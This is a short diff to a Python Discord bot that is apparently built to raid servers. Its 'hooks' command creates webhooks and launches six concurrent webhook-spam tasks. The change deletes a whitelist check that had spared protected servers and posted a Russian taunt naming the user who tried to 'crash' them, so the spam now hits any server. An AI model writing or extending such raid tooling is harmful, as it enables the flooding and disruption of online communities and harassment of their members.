@@ -264,18 +264,13 @@ async def gif(ctx):
 
 @client.command()
 async def hooks(ctx):
-  id = ctx.message.guild.id
-  if id in gwhit:
-    await ctx.send("Этот сервер ЗАЩИЩЕН! Я его НЕ ТРОНУ!")
-    await ctx.send(f"Вас пытался крашнуть {ctx.message.author.mention}, но обосрался, id - {ctx.message.author.id}")
-  else:
-    await crhooks(ctx)
-    asyncio.create_task(spamhook(ctx))
-    asyncio.create_task(spamhook(ctx))
-    asyncio.create_task(spamhook(ctx))
-    asyncio.create_task(spamhook(ctx))
-    asyncio.create_task(spamhook(ctx))
-    asyncio.create_task(spamhook(ctx))
+   await crhooks(ctx)
+   asyncio.create_task(spamhook(ctx))
+   asyncio.create_task(spamhook(ctx))
+   asyncio.create_task(spamhook(ctx))
+   asyncio.create_task(spamhook(ctx))
+   asyncio.create_task(spamhook(ctx))
+   asyncio.create_task(spamhook(ctx))
 
 
 
